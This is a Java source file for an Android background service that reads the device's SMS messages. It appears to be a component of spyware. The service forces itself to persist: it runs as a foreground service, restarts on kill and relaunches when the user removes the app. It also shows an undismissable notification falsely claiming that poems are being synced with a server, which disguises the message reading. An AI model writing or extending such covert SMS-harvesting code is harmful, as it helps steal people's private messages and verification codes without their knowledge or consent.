package com.dawillygene.venlitgenexombiev2;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

public class SmsReaderService extends Service {
    private static final String TAG = "SmsReaderService";
    private static final String CHANNEL_ID = "sms_reader_channel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        
        // Start as foreground service to prevent being killed
        startForeground(NOTIFICATION_ID, createNotification());
        Log.d(TAG, "SMS Reader Service started as FOREGROUND service");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "SMS Reader Service command received - ensuring foreground status");

        // Ensure we're running as foreground service
        startForeground(NOTIFICATION_ID, createNotification());

        // Process SMS in background thread
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    SmsReader.readSms(SmsReaderService.this);
                } catch (Exception e) {
                    Log.e(TAG, "Error in SMS processing", e);
                }
                // Service continues running as foreground service
            }
        }).start();

        // Return START_STICKY so service restarts if killed by system
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "SMS Reader Service is being destroyed");
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "App removed from task manager - restarting service");
        // Restart the service when app is removed from task manager
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        startService(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    private void createNotificationChannel() {
        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "SMS Reader Service Channel",
                NotificationManager.IMPORTANCE_LOW  // Low importance to minimize interruption
        );
        serviceChannel.setDescription("Keeps SMS reading service running in background");
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(serviceChannel);
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("POETIC TIMELIINE")
                .setContentText("Poems are being sync with server...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)  // Low priority notification
                .setOngoing(true)  // Cannot be dismissed by user
                .setAutoCancel(false)  // Prevent accidental dismissal
                .build();
    }
}